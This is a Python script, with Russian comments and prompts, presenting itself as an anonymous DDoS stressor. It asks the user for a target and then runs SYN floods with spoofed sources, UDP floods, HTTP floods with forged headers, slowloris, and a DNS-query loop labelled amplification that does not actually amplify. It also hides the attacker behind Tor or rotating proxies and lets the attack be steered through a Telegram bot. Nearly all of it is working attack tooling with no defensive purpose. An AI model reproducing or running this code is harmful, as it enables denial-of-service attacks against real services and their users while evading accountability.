#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTIMATE INTERACTIVE ANONYMOUS DDoS STRESSOR
Run it, answer questions, stay ghost.
"""
import sys, os, time, random, socket, struct, threading, queue, logging
from collections import defaultdict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import socks  # PySocks для SOCKS прокси
except ImportError:
    print("Установи зависимости: pip install requests pysocks")
    sys.exit(1)

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ (заполняются через вопросы) ==========
TARGET_URL = ""
TARGET_IP = ""
TARGET_PORT = 80
THREADS = 500
PROXY_FILE = ""
PROXY_TYPE = "http"          # http, socks4, socks5
ATTACK_VECTORS = []          # ['syn','udp','http','slowloris','dnsamp']
DURATION = 0                 # 0 = бесконечно
JITTER = True
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""
# Анонимные настройки
FORCE_PROXY = True           # Если True, без рабочего прокси атака не начнётся
TOR_MODE = False             # Включится, если выбран socks5 и адрес 127.0.0.1:9050
# ==============================

stats = {
    'packets_sent': 0,
    'bytes_sent': 0,
    'success': 0,
    'failed': 0,
    'start_time': time.time()
}
stop_event = threading.Event()
proxy_list = []
proxy_queue = queue.Queue()
log_lock = threading.Lock()

def color_text(text, color_code):
    """Простой цветной вывод."""
    return f"\033[{color_code}m{text}\033[0m"

def print_banner():
    banner = """
    █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║    ██║  ██║██████╔╝██║   ██║███████╗
    ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║    ██║  ██║██╔══██╗██║   ██║╚════██║
    ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║    ██████╔╝██║  ██║╚██████╔╝███████║
    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
    """
    print(color_text(banner, "35"))  # фиолетовый
    print(color_text("ДОБРО ПОЖАЛОВАТЬ В АНОНИМНЫЙ СТРЕСС-ПАНЕЛЬ", "36"))
    print(color_text("Все вопросы обязательны. Для ответа по умолчанию просто жми Enter.\n", "33"))

def ask_questions():
    global TARGET_URL, TARGET_IP, TARGET_PORT, THREADS, PROXY_FILE, PROXY_TYPE
    global ATTACK_VECTORS, DURATION, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, FORCE_PROXY, TOR_MODE

    print_banner()
    
    # Цель
    print(color_text("[?] ЦЕЛЬ:", "32"))
    print(color_text("    Можно ввести URL (http://site.com) или IP (192.168.1.1).", "90"))
    target = input("    Введи цель: ").strip()
    if target.startswith("http://") or target.startswith("https://"):
        TARGET_URL = target
        # попытаемся вытащить IP для SYN/UDP
        try:
            from urllib.parse import urlparse
            hostname = urlparse(TARGET_URL).hostname
            TARGET_IP = socket.gethostbyname(hostname)
        except:
            TARGET_IP = "127.0.0.1"
    else:
        TARGET_IP = target
        TARGET_URL = f"http://{target}"  # fallback
    
    # Порт
    port_str = input(color_text(f"[?] Порт (по умолч. 80): ", "32"))
    TARGET_PORT = int(port_str) if port_str else 80

    # Векторы атак
    print(color_text("[?] ВЕКТОРЫ АТАК (вводи через запятую):", "32"))
    print(color_text("    Доступны: syn, udp, http, slowloris, dnsamp", "90"))
    print(color_text("    Совет: для обхода большинства защит используй http+slowloris", "93"))
    vec_input = input("    Твои векторы: ").strip().lower()
    if not vec_input:
        ATTACK_VECTORS = ['http', 'slowloris']
    else:
        ATTACK_VECTORS = [v.strip() for v in vec_input.split(',') if v.strip() in ['syn','udp','http','slowloris','dnsamp']]
        if not ATTACK_VECTORS:
            print(color_text("Неверный вектор. Использую http.", "91"))
            ATTACK_VECTORS = ['http']
    
    # Потоки
    threads_str = input(color_text(f"[?] Количество потоков (по умолч. 500): ", "32"))
    THREADS = int(threads_str) if threads_str else 500
    
    # Продолжительность
    dur_str = input(color_text(f"[?] Продолжительность в секундах (0 = бесконечно): ", "32"))
    DURATION = int(dur_str) if dur_str else 0

    # Прокси и анонимность
    print(color_text("[?] АНОНИМНОСТЬ:", "32"))
    print(color_text("    Для полной анонимности используй Tor (включи Tor Browser или службу tor).", "90"))
    proxy_choice = input("    Использовать Tor? (y/n, Enter = n): ").strip().lower()
    if proxy_choice == 'y':
        TOR_MODE = True
        PROXY_TYPE = 'socks5'
        PROXY_FILE = ""  # не нужен файл
        print(color_text("    [!] Tor будет использован как SOCKS5 прокси 127.0.0.1:9050", "93"))
    else:
        proxy_file_input = input(color_text("    Путь к файлу с проксями (ip:port на строке), Enter если нет: ", "32")).strip()
        if proxy_file_input:
            PROXY_FILE = proxy_file_input
            type_choice = input(color_text("    Тип прокси (http, socks4, socks5, по умолч. http): ", "32")).strip().lower()
            if type_choice in ['http','socks4','socks5']:
                PROXY_TYPE = type_choice
            else:
                PROXY_TYPE = 'http'
        else:
            FORCE_PROXY = False
            print(color_text("    [!] Без прокси твой реальный IP может быть виден! Рекомендую VPN.", "91"))
    
    # Telegram C&C (опционально)
    print(color_text("[?] УПРАВЛЕНИЕ ЧЕРЕЗ TELEGRAM (необязательно):", "32"))
    tok = input("    Telegram Bot Token (Enter чтобы пропустить): ").strip()
    if tok:
        TELEGRAM_BOT_TOKEN = tok
        chat = input("    Твой Chat ID: ").strip()
        TELEGRAM_CHAT_ID = chat

    # Подтверждение
    print("\n" + color_text("======================================", "36"))
    print(color_text("  СВОДКА ПАРАМЕТРОВ:", "33"))
    print(f"  Цель URL: {TARGET_URL}")
    print(f"  Цель IP: {TARGET_IP}:{TARGET_PORT}")
    print(f"  Векторы: {', '.join(ATTACK_VECTORS)}")
    print(f"  Потоков: {THREADS}")
    print(f"  Длительность: {'бесконечно' if DURATION==0 else f'{DURATION} сек'}")
    if TOR_MODE:
        print(f"  Tor SOCKS5: 127.0.0.1:9050")
    elif PROXY_FILE:
        print(f"  Прокси из файла: {PROXY_FILE} ({PROXY_TYPE})")
    else:
        print(f"  Прокси: ОТСУТСТВУЮТ (анонимность под угрозой)")
    print(color_text("======================================\n", "36"))
    confirm = input("Начинаем? (y/n): ").strip().lower()
    if confirm != 'y':
        print("Отмена.")
        sys.exit(0)

# ---------- ПРОКСИ И АНОНИМИЗАЦИЯ ----------
def load_proxies_from_file(filename):
    global proxy_list
    if not os.path.exists(filename):
        print(color_text(f"Файл {filename} не найден.", "91"))
        return
    with open(filename, 'r') as f:
        for line in f:
            addr = line.strip()
            if addr:
                proxy_list.append(addr)
                proxy_queue.put(addr)
    print(color_text(f"[+] Загружено {len(proxy_list)} прокси.", "92"))

def check_proxy(proxy_str, proxy_type='http'):
    """Проверка прокси через тестовый HTTP запрос."""
    try:
        if proxy_type == 'http':
            proxies = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        elif proxy_type == 'socks4':
            proxies = {"http": f"socks4://{proxy_str}", "https": f"socks4://{proxy_str}"}
        elif proxy_type == 'socks5':
            proxies = {"http": f"socks5://{proxy_str}", "https": f"socks5://{proxy_str}"}
        else:
            return False
        r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
        return r.status_code == 200
    except:
        return False

def get_proxy():
    """Получить прокси из очереди с ротацией, либо (Tor) фиксированный."""
    if TOR_MODE:
        return "127.0.0.1:9050"
    try:
        p = proxy_queue.get_nowait()
        proxy_queue.put(p)
        return p
    except queue.Empty:
        if FORCE_PROXY and proxy_list:
            # повторно наполнить?
            return None
        return None

def create_tor_session():
    """Создает requests.Session с маршрутизацией через Tor."""
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    return session

# ---------- ФЕЙКОВЫЕ ЗАГОЛОВКИ ----------
def fake_http_headers():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    ]
    headers = {
        'User-Agent': random.choice(ua_list),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        'Client-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    }
    return headers

# ---------- ВЕКТОРЫ АТАК ----------
def syn_flood(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(color_text("[!] SYN требует права root. Пропускаю.", "91"))
        return
    while not stop_event.is_set():
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = random.randint(64, 128)
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        
        tcp_doff = 5
        tcp_flags = 0x02
        tcp_win = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, port,
                                 seq, 0,
                                 tcp_offset_res, tcp_flags,
                                 tcp_win, tcp_check, tcp_urg_ptr)
        
        packet = ip_header + tcp_header
        try:
            s.sendto(packet, (ip, 0))
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(packet)
        except:
            pass
        time.sleep(random.uniform(0.0001, 0.001) if JITTER else 0.01)

def udp_flood(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    while not stop_event.is_set():
        data = random._urandom(random.randint(64, 1400))
        try:
            s.sendto(data, (ip, random.randint(1, 65535)))
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(data)
        except:
            pass
        time.sleep(random.uniform(0.0001, 0.001) if JITTER else 0.02)

def http_flood(url):
    session = requests.Session()
    retries = Retry(total=0)
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    while not stop_event.is_set():
        headers = fake_http_headers()
        uri = f"{url}?{random.randint(0,9999999)}={random.randint(0,9999999)}"
        proxy_addr = get_proxy()
        proxies = None
        if proxy_addr:
            if TOR_MODE:
                proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            else:
                if PROXY_TYPE == 'http':
                    proxies = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"}
                elif PROXY_TYPE == 'socks4':
                    proxies = {"http": f"socks4://{proxy_addr}", "https": f"socks4://{proxy_addr}"}
                elif PROXY_TYPE == 'socks5':
                    proxies = {"http": f"socks5://{proxy_addr}", "https": f"socks5://{proxy_addr}"}
        
        try:
            r = session.get(uri, headers=headers, proxies=proxies, timeout=3)
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(r.content)
            if r.status_code == 200:
                stats['success'] += 1
            else:
                stats['failed'] += 1
        except:
            stats['failed'] += 1
        time.sleep(random.uniform(0.01, 0.05) if JITTER else 0.02)

def slowloris(ip, port):
    sockets_list = []
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {ip}\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            sockets_list.append(s)
            stats['packets_sent'] += 1
        except:
            pass
        for sock in sockets_list[:]:
            try:
                sock.send(f"X-a: {random.randint(0,9999)}\r\n".encode())
            except:
                sockets_list.remove(sock)
        time.sleep(random.uniform(0.5, 2))
    for s in sockets_list:
        s.close()

def dns_amplification(dns_server, target_ip):
    dns_query = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\xff\x00\x01'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(dns_query, (dns_server, 53))
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(dns_query)
        except:
            pass
        time.sleep(0.1)

# ---------- TELEGRAM C&C ----------
def telegram_bot():
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    base = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    while not stop_event.is_set():
        try:
            r = requests.get(f"{base}/getUpdates?offset=-1", timeout=10)
            updates = r.json().get('result', [])
            for upd in updates:
                msg = upd.get('message', {}).get('text', '')
                if msg.startswith('/stopatt'):
                    stop_event.set()
                    print(color_text("\n[!] Атака остановлена через Telegram", "93"))
                elif msg.startswith('/target'):
                    _, url = msg.split(maxsplit=1)
                    global TARGET_URL
                    TARGET_URL = url
                    print(color_text(f"\n[!] Цель изменена на {url}", "93"))
            time.sleep(5)
        except:
            pass

# ---------- ЗАПУСК ПОТОКОВ ----------
def worker(vector):
    if vector == 'syn':
        syn_flood(TARGET_IP, TARGET_PORT)
    elif vector == 'udp':
        udp_flood(TARGET_IP, TARGET_PORT)
    elif vector == 'http':
        http_flood(TARGET_URL)
    elif vector == 'slowloris':
        slowloris(TARGET_IP, TARGET_PORT)
    elif vector == 'dnsamp':
        dns_amplification("8.8.8.8", TARGET_IP)

def main():
    global stop_event
    ask_questions()
    
    # Загрузка прокси (если не Tor)
    if TOR_MODE:
        print(color_text("[*] Проверяем Tor соединение...", "93"))
        try:
            test_sess = create_tor_session()
            r = test_sess.get("http://httpbin.org/ip", timeout=10)
            if r.status_code == 200:
                print(color_text(f"[+] Tor работает. Ваш анонимный IP: {r.json().get('origin', 'unknown')}", "92"))
            else:
                print(color_text("[-] Tor отвечает, но ошибка. Продолжаем с риском.", "91"))
        except Exception as e:
            print(color_text(f"[-] Tor не доступен: {e}. Выход.", "91"))
            sys.exit(1)
    elif PROXY_FILE:
        load_proxies_from_file(PROXY_FILE)
        # можно проверить несколько прокси
        if proxy_list:
            print(color_text("[*] Проверка первых 5 прокси...", "93"))
            working = 0
            for p in proxy_list[:5]:
                if check_proxy(p, PROXY_TYPE):
                    working += 1
            print(color_text(f"[+] Рабочих прокси примерно {working} из проверенных.", "92"))
            if working == 0 and FORCE_PROXY:
                print(color_text("[-] Нет рабочих прокси. Выход.", "91"))
                sys.exit(1)
    
    # Предупреждение о root
    if 'syn' in ATTACK_VECTORS and os.geteuid() != 0:
        print(color_text("[!] SYN flood требует root. Убери 'syn' или запусти с sudo.", "91"))
        choice = input("Продолжить без SYN? (y/n): ").strip().lower()
        if choice != 'y':
            sys.exit(0)
        ATTACK_VECTORS.remove('syn')
    
    # Старт C&C
    if TELEGRAM_BOT_TOKEN:
        threading.Thread(target=telegram_bot, daemon=True).start()
    
    threads = []
    total_threads = THREADS
    per_vector = total_threads // len(ATTACK_VECTORS) if ATTACK_VECTORS else 0
    for vec in ATTACK_VECTORS:
        for _ in range(per_vector):
            t = threading.Thread(target=worker, args=(vec,))
            t.daemon = True
            threads.append(t)
    
    start = time.time()
    for t in threads:
        t.start()
    
    print(color_text("\n[!] АТАКА НАЧАЛАСЬ. Нажми Ctrl+C для ручной остановки.", "91"))
    try:
        while not stop_event.is_set():
            elapsed = time.time() - start
            sent = stats['packets_sent']
            bsent = stats['bytes_sent']
            print(f"\r[+] Пакетов: {sent} | Байт: {bsent} | Скорость: {sent/elapsed:.1f} п/с | Прошло: {elapsed:.0f}с", end='')
            if DURATION > 0 and elapsed >= DURATION:
                stop_event.set()
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        print(color_text("\n[!] Остановка...", "93"))
        print(f"Итого: {stats}")
        sys.exit(0)

if __name__ == "__main__":
    main()